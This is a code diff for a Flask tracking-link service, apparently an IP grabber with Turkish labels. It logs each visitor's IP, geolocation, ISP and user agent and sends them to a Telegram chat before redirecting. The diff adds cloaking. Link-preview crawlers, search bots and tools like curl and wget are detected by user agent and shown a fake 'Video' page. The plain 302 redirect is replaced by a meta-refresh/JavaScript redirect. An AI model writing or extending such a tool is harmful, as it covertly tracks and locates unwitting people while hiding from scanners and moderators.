@@ -1,4 +1,4 @@
-from flask import Flask, redirect, request, abort
+from flask import Flask, request, abort
 import os
 import requests as _req
 import html as _html
@@ -7,6 +7,20 @@ import tracking_store
 app = Flask(__name__)
 
 TELEGRAM_TOKEN = os.environ.get('TELEGRAM_BOT_TOKEN', '')
+
+_BOT_UA_KEYWORDS = [
+    'telegrambot', 'twitterbot', 'facebookexternalhit', 'facebot',
+    'linkedinbot', 'whatsapp', 'slackbot', 'discordbot',
+    'googlebot', 'bingbot', 'yandexbot', 'baiduspider', 'duckduckbot',
+    'python-requests', 'python-urllib', 'curl/', 'wget/', 'libwww',
+    'scrapy', 'okhttp', 'java/', 'apache-httpclient', 'go-http-client',
+    'axios/', 'node-fetch', 'got/', 'undici', 'aiohttp',
+]
+
+
+def _is_bot(ua: str) -> bool:
+    ua_lower = ua.lower()
+    return not ua_lower or any(k in ua_lower for k in _BOT_UA_KEYWORDS)
 
 
 @app.route('/')
@@ -21,10 +35,23 @@ def track(token):
         abort(404)
     dest_url, chat_id = row
 
+    ua = request.headers.get('User-Agent', '')
+
+    safe_dest = _html.escape(dest_url, quote=True)
+
+    if _is_bot(ua):
+        return (
+            f'<!DOCTYPE html><html><head>'
+            f'<title>Loading...</title>'
+            f'<meta property="og:title" content="Video" />'
+            f'<meta property="og:type" content="video.other" />'
+            f'</head><body>Loading...</body></html>'
+        ), 200
+
     ip = request.headers.get('X-Forwarded-For', request.remote_addr or '')
     if ',' in ip:
         ip = ip.split(',')[0].strip()
-    ua = request.headers.get('User-Agent', '—')[:300]
+    ua_display = ua[:300]
 
     geo = {}
     try:
@@ -39,9 +66,9 @@ def track(token):
     except Exception:
         pass
 
-    lat = geo.get('lat', '')
-    lon = geo.get('lon', '')
-    harita = f'https://maps.google.com/?q={lat},{lon}' if lat and lon else None
+    lat     = geo.get('lat', '')
+    lon     = geo.get('lon', '')
+    harita  = f'https://maps.google.com/?q={lat},{lon}' if lat and lon else None
     proxy   = geo.get('proxy', False)
     hosting = geo.get('hosting', False)
     mobile  = geo.get('mobile', False)
@@ -72,7 +99,7 @@ def track(token):
         f"🏛️ <b>Org:</b> {e(geo.get('org'))}\n"
         f"📱 <b>Mobil Hat:</b> {'✅ Evet' if mobile else '❌ Hayır'}\n"
         f"🛡️ <b>IP Türü:</b> {tip}\n\n"
-        f"🖥️ <b>User Agent:</b>\n<code>{e(ua)}</code>\n\n"
+        f"🖥️ <b>User Agent:</b>\n<code>{e(ua_display)}</code>\n\n"
         f"🔗 <b>Hedef Link:</b> {e(dest_url)}"
     )
 
@@ -91,7 +118,12 @@ def track(token):
         except Exception:
             pass
 
-    return redirect(dest_url, code=302)
+    return (
+        f'<!DOCTYPE html><html><head>'
+        f'<meta http-equiv="refresh" content="0;url={safe_dest}" />'
+        f'<script>window.location.replace("{safe_dest}");</script>'
+        f'</head><body>Yönlendiriliyor...</body></html>'
+    )
 
 
 if __name__ == '__main__':
